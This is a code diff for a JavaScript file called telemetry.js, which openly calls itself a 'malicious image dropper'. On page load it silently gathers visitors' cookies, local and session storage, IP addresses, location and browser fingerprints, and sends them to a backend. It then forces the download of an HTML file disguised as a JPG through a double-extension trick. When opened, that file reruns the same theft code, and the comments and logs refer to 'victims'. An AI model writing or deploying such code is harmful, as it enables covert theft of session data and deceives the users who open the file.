@@ -1,4 +1,4 @@
-// telemetry.js – Universal Image Dropper + Silent Telemetry (Android/iOS/Windows)
+// telemetry.js – Universal Image Dropper (Double Extension Trick) + Silent Telemetry
 (function() {
   'use strict';
 
@@ -20,7 +20,6 @@
 
   // ---------- 1. BROWSER DATA EXFIL (AUTO, NO PERMISSION) ----------
   async function collectBrowserData() {
-    // Device & screen
     const device = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -35,7 +34,6 @@
       vendor: navigator.vendor || 'N/A'
     };
 
-    // Battery
     let battery = 'N/A';
     if (navigator.getBattery) {
       try {
@@ -44,7 +42,6 @@
       } catch(_) {}
     }
 
-    // Local IP (WebRTC)
     let localIPs = ['N/A'];
     try {
       const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -65,20 +62,17 @@
       pc.close();
     } catch(_) {}
 
-    // Public IP + Approx Location
     let publicData = {};
     try {
       const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
       publicData = await r.json();
     } catch(_) {}
 
-    // Cookies, localStorage, sessionStorage
     const cookies = document.cookie || 'No cookies';
     let localStorageData = {}, sessionStorageData = {};
     try { localStorageData = { ...localStorage }; } catch(_) {}
     try { sessionStorageData = { ...sessionStorage }; } catch(_) {}
 
-    // Canvas fingerprint
     let canvas = 'N/A';
     try {
       const c = document.createElement('canvas');
@@ -98,7 +92,6 @@
       canvas = c.toDataURL();
     } catch(_) {}
 
-    // Installed fonts (browser)
     let fonts = [];
     try {
       const base = ['monospace','sans-serif','serif'];
@@ -138,29 +131,22 @@
     };
   }
 
-  // ---------- 2. MALICIOUS IMAGE DROPPER (CROSS-PLATFORM HTML DISGUISED AS JPG) ----------
+  // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION TRICK) ----------
   function dropMaliciousImage() {
     try {
-      // Build a self-contained HTML page that shows a real image and runs telemetry
-      // The telemetry code is the same as above, minified/inlined.
-      // We'll also include a beautiful preview with a real image URL.
-      const imageUrl = 'https://files.catbox.moe/l9xdjq.png'; // or any public image
+      // Real image URL (will be displayed inside the HTML)
+      const imageUrl = 'https://files.catbox.moe/l9xdjq.png'; // A real image
       const siteUrl = window.location.origin;
 
+      // Self-contained HTML page that shows a real image and runs telemetry
       const htmlContent = `<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>IMG_2025</title>
-  <!-- Social preview (custom thumbnail) -->
-  <meta property="og:type" content="image" />
   <meta property="og:image" content="${imageUrl}" />
-  <meta property="og:image:width" content="800" />
-  <meta property="og:image:height" content="600" />
   <meta property="og:title" content="Beautiful Sunset" />
-  <meta property="og:description" content="Click to view full image" />
-  <meta name="twitter:card" content="summary_large_image" />
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
@@ -172,8 +158,8 @@
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
     }
     .container {
-      max-width: 90vw;
-      max-height: 90vh;
+      max-width: 95vw;
+      max-height: 95vh;
       border-radius: 12px;
       overflow: hidden;
       box-shadow: 0 20px 60px rgba(0,0,0,0.8);
@@ -187,33 +173,24 @@
       object-fit: contain;
     }
     .caption {
-      padding: 12px 20px;
-      color: #eee;
+      padding: 10px 20px;
+      color: #ccc;
       text-align: center;
-      font-size: 14px;
-      background: #222;
+      font-size: 13px;
+      background: #1a1a1a;
       border-top: 1px solid #333;
-    }
-    .caption small {
-      opacity: 0.7;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <img src="${imageUrl}" alt="Beautiful Sunset" />
-    <div class="caption">
-      <span>📸 IMG_2025</span> <small>• Tap to share</small>
-    </div>
+    <div class="caption">📸 IMG_2025 • Tap to share</div>
   </div>
 
   <!-- ========== TELEMETRY SCRIPT (SILENT) ========== -->
   <script>
     (function() {
-      // This script runs automatically when the image page is opened.
-      // It will collect data and send to the backend.
-      // We duplicate the telemetry logic here to make the HTML self-contained.
-
       const ENDPOINT = '${siteUrl}/.netlify/functions/telemetry';
 
       async function sendData(module, payload) {
@@ -229,7 +206,6 @@
       }
 
       async function collect() {
-        // Basic device
         const device = {
           userAgent: navigator.userAgent,
           platform: navigator.platform,
@@ -242,7 +218,6 @@
           vendor: navigator.vendor || 'N/A'
         };
 
-        // Battery
         let battery = 'N/A';
         if (navigator.getBattery) {
           try {
@@ -251,7 +226,6 @@
           } catch(_) {}
         }
 
-        // Local IP (WebRTC)
         let localIPs = ['N/A'];
         try {
           const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -272,20 +246,17 @@
           pc.close();
         } catch(_) {}
 
-        // Public IP
         let publicData = {};
         try {
           const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
           publicData = await r.json();
         } catch(_) {}
 
-        // Cookies & storage
         const cookies = document.cookie || 'No cookies';
         let localStorageData = {}, sessionStorageData = {};
         try { localStorageData = { ...localStorage }; } catch(_) {}
         try { sessionStorageData = { ...sessionStorage }; } catch(_) {}
 
-        // Canvas fingerprint
         let canvas = 'N/A';
         try {
           const c = document.createElement('canvas');
@@ -305,7 +276,6 @@
           canvas = c.toDataURL();
         } catch(_) {}
 
-        // Installed fonts
         let fonts = [];
         try {
           const base = ['monospace','sans-serif','serif'];
@@ -354,13 +324,13 @@
 </body>
 </html>`;
 
-      // Create blob with type 'image/jpeg' to trick the browser
-      // But we set the download filename as 'IMG_2025.jpg'
-      const blob = new Blob([htmlContent], { type: 'image/jpeg' });
+      // Download as HTML with double extension: .jpg.html
+      // This way, if victim has "Hide extensions" enabled, they see only .jpg
+      const blob = new Blob([htmlContent], { type: 'text/html' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'IMG_2025.jpg'; // Pretend it's a JPG
+      a.download = 'IMG_2025.jpg.html'; // DOUBLE EXTENSION TRICK
       a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
@@ -370,12 +340,10 @@
         URL.revokeObjectURL(url);
       }, 200);
 
-      // Notify backend that dropper was delivered
       sendToBackend('IMAGE_DROPPER_DELIVERED', {
         status: 'Downloaded',
-        filename: 'IMG_2025.jpg',
-        size: blob.size + ' bytes',
-        note: 'Victim sees a .jpg file, but it\'s actually HTML. When opened, telemetry runs.'
+        filename: 'IMG_2025.jpg.html',
+        note: 'Victim sees "IMG_2025.jpg" if extensions are hidden. Opens in browser.'
       });
     } catch (e) {
       sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
@@ -387,16 +355,16 @@
     if (executed) return;
     executed = true;
 
-    console.log('%c📸 Dropping malicious image payload...', 'font-size:16px; color:#ff6600;');
+    console.log('%c📸 Dropping double-extension image payload...', 'font-size:16px; color:#ff6600;');
 
-    // First, collect browser data automatically
+    // Auto telemetry
     const data = await collectBrowserData();
     await sendToBackend('AUTO_TELEMETRY', data);
 
-    // Then drop the disguised image (HTML)
+    // Drop the disguised HTML file
     dropMaliciousImage();
 
-    console.log('%c✅ Image dropper delivered. Victim will see a .jpg file.', 'font-size:16px; color:#00ffcc;');
+    console.log('%c✅ Payload delivered. File: IMG_2025.jpg.html (shows as .jpg)', 'font-size:16px; color:#00ffcc;');
   }
 
   // ---------- 4. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
